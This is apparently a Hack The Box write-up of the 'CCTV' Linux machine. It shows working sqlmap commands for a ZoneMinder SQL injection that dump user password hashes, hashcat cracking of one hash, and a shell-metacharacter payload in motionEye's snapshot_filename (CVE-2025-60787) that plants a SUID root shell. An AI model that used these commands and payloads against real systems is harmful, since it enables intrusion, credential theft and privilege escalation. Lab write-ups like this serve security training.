# Linux Machine CCTV - Easy

## Initial Setup

Connect to vpn 
Start the Machine 

## Reconnaissance

### Nmap Scan

Lets start with nmap 

```
weed@weed-bharath:~/Documents/HTB/season10/CCTV$ sudo nmap -sC -sV 10.129.33.182 -Pn
[sudo] password for weed: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-08 00:38 IST
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.65% done; ETC: 00:39 (0:00:00 remaining)
Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.65% done; ETC: 00:39 (0:00:00 remaining)
Nmap scan report for 10.129.33.182
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.07 seconds

```

### Host Configuration

```
sudo echo "10.129.33.182 cctv.htb" > /etc/hosts
```

We Found out a staff login page at 

```
http://cctv.htb/zm
```

login using **admin**:**admin**

## Exploitation

got the dashboard access at 

```
http://cctv.htb/zm/?view=console
```
The version of the webpage was v1.37.63


A little search with "v1.37.63 ZoneMonitor"

### SQL Injection Vuln

```
https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3
```

lets use sqlmap to analyze it 

```
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
  --cookie="ZMSESSID=<your_session_id>" \
  --dbs --batch
```
Detected some databases

```
available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm
```
### Get user and passwords

```
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1'   --cookie="ZMSESSID=<your_session_id>"   --batch --technique=T --time-sec=1 --dbms=mysql   -D zm -T Users -C Username,Password --dump
```

There were three users 
1. superadm  >  $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
2. mark      >  $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
3. admin     >  $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m

```
Table: Users
[3 entries]
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
```

### Password Cracking

**Prepare hash file:**
```
echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > mark.txt
```

**Crack with John:**

```
hashcat -m 3200 mark.txt /home/weed/Downloads/wordlists/wordlists-kali-master/rockyou.txt --force
```

The password for **Mark**:'opensesame'

###  SSH Access & User Flag

ssh mark@10.129.33.182

we got the shell

```
mark@cctv:~$ ls -la
total 36
drwxr-x--- 5 mark mark 4096 Mar  2 09:49 .
drwxr-xr-x 4 root root 4096 Mar  2 09:49 ..
lrwxrwxrwx 1 root root    9 Feb 13 10:01 .bash_history -> /dev/null
-rw-r--r-- 1 mark mark  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 mark mark 3771 Mar 31  2024 .bashrc
drwx------ 2 mark mark 4096 Mar  2 09:49 .cache
drwx------ 3 mark mark 4096 Mar  2 09:49 .gnupg
-rw-r--r-- 1 mark mark  807 Mar 31  2024 .profile
drwx------ 2 mark mark 4096 Mar  2 09:49 .ssh
-rw-rw-r-- 1 mark mark  165 Sep 14 22:15 .wget-hsts
mark@cctv:~$ cd home
-bash: cd: home: No such file or directory
mark@cctv:~$ cd /home
mark@cctv:/home$ ls
mark  sa_mark
```

was not able to access any files this is because

1. No user flag in mark's home — mark wasn't the target, needed to pivot to sa_mark
2. sa_mark existed as a user — /etc/passwd showed sa_mark:x:1001:1001::/home/sa_mark:/bin/sh but we couldn't access their home
3. sudo -l showed nothing — no direct privilege escalation path for mark
4. No SUID binaries worth exploiting — nothing unusual there
5. ss -tlnp showed multiple ports only listening on localhost — this was the key signal:
127.0.0.1:8765   ← motionEye
127.0.0.1:7999   ← motion HTTP API
127.0.0.1:8888
127.0.0.1:9081
127.0.0.1:1935
Services listening only on localhost mean they're not exposed externally but are accessible from within the box. This is a classic HTB pattern — internal services are hidden from outside but accessible once you have a foothold, and they often run as a different user or have vulnerabilities that allow privilege escalation.

### Enumerate Internal Services

```
ss -tlnp
```
Found motionEye on 127.0.0.1:8765 and motion on 127.0.0.1:7999

### CVE-2025-60787

The core vulnerability was CVE-2025-60787 — motionEye allows unsanitized shell metacharacters in the snapshot_filename config, which motion executes as a shell command when saving snapshots.

```
cat /etc/motioneye/motion.conf
```
Found: admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0

Now we set malicious snapshot_filename via motion HTTP API

```
curl -s "http://127.0.0.1:7999/1/config/set?picture_output=on"
curl -s "http://127.0.0.1:7999/1/config/set?snapshot_filename=%24(cp%20/bin/bash%20/tmp/rootbash%20%26%26%20chmod%20u%2Bs%20/tmp/rootbash).test"
```
### Trigger snapshot to execute the payload

```
curl -s "http://127.0.0.1:7999/1/action/snapshot"
```

### Root Access and Get Flag
```
/tmp/rootbash -p
cat /root/root.txt
cat /home/sa_mark/user.txt
```